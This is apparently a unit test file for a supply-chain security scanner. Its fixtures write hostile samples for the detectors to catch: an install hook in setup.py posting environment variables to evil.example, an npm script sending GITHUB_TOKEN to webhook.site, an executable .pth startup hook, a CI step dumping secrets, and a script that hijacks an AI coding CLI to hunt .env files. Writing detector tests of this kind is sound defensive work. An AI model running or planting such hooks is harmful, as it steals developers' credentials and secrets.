"""Unit tests for Round #14: GuardDog / Shai-Hulud / s1ngularity / tj-actions supply-chain worm detectors."""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from openguard.models import Severity
from openguard.scanners.ci_workflow_scanner import CIWorkflowScanner
from openguard.scanners.install_script_scanner import InstallScriptScanner


class TestSupplyChainWormsAndCICompromise(unittest.TestCase):
    def test_python_pth_backdoor_and_benign_pth(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # Benign path-only .pth must produce 0 findings
            (root / "safe_paths.pth").write_text("./src\n# comment\n/opt/custom_libs\n", encoding="utf-8")
            clean = InstallScriptScanner().scan_repository(root)
            self.assertEqual(len(clean), 0)

            # Shai-Hulud-style executable .pth startup hook
            (root / "evil-setup.pth").write_text(
                "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
                encoding="utf-8",
            )
            findings = InstallScriptScanner().scan_repository(root)
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0].id, "OG-SUP-PY-002")
            self.assertEqual(findings[0].severity, Severity.CRITICAL)
            self.assertEqual(findings[0].priority_tier, "P0")

    def test_setup_py_guarddog_cmdclass_and_exfiltration(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "setup.py").write_text(
                "import os, requests\n"
                "from setuptools import setup\n"
                "from setuptools.command.install import install\n"
                "class CustomInstall(install):\n"
                "    def run(self):\n"
                "        requests.post('https://evil.example/exfil', json=dict(os.environ))\n"
                "        super().run()\n"
                "setup(name='evilpkg', version='0.1.0', cmdclass={'install': CustomInstall})\n",
                encoding="utf-8",
            )
            findings = InstallScriptScanner().scan_repository(root)
            ids = {f.id for f in findings}
            self.assertIn("OG-SUP-PY-003", ids)
            py003 = next(f for f in findings if f.id == "OG-SUP-PY-003")
            self.assertEqual(py003.severity, Severity.CRITICAL)

    def test_npm_linked_postinstall_s1ngularity_ai_hijack_and_exfil(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # 1. Benign build script produces 0 findings
            (root / "build.js").write_text("console.log('compiling assets');\n", encoding="utf-8")
            (root / "package.json").write_text(
                json.dumps({"name": "clean-pkg", "version": "1.0.0", "scripts": {"postinstall": "node build.js"}}),
                encoding="utf-8",
            )
            self.assertEqual(len(InstallScriptScanner().scan_repository(root)), 0)

            # 2. s1ngularity / Nx-style AI CLI hijack in telemetry.js
            (root / "telemetry.js").write_text(
                "const cp = require('child_process');\n"
                "cp.execSync('claude --dangerously-skip-permissions -p \"find .env files\"');\n",
                encoding="utf-8",
            )
            (root / "exfil.js").write_text(
                "const token = process.env.GITHUB_TOKEN;\n"
                "fetch('https://webhook.site/abc-123', { method: 'POST', body: token });\n",
                encoding="utf-8",
            )
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "evil-nx-clone",
                        "version": "1.0.1",
                        "scripts": {
                            "postinstall": "node telemetry.js",
                            "prepare": "node exfil.js",
                        },
                    }
                ),
                encoding="utf-8",
            )
            findings = InstallScriptScanner().scan_repository(root)
            ids = {f.id for f in findings}
            self.assertIn("OG-SUP-NPM-004", ids)
            self.assertIn("OG-SUP-NPM-005", ids)

    def test_ci_workflow_catches_tj_actions_mutable_tag_and_secret_dump(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            wf = root / ".github" / "workflows" / "ci.yml"
            wf.parent.mkdir(parents=True, exist_ok=True)
            wf.write_text(
                "name: CI\n"
                "on: [push]\n"
                "permissions:\n"
                "  contents: read\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: tj-actions/changed-files@v45\n"
                "      - uses: reviewdog/action-setup@a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4\n"
                "      - run: echo '${{ toJSON(secrets) }}'\n"
                "      - run: printenv | base64\n",
                encoding="utf-8",
            )
            findings = CIWorkflowScanner().scan_repository(root)
            by_id = {f.rule_id: f for f in findings}
            self.assertIn("OG-CI-007", by_id)
            self.assertEqual(by_id["OG-CI-007"].severity, Severity.CRITICAL)
            # Only the unpinned tj-actions triggers OG-CI-007; SHA-pinned reviewdog must not
            self.assertEqual(sum(1 for f in findings if f.rule_id == "OG-CI-007"), 1)
            self.assertEqual(sum(1 for f in findings if f.rule_id == "OG-CI-008"), 2)


if __name__ == "__main__":
    unittest.main()
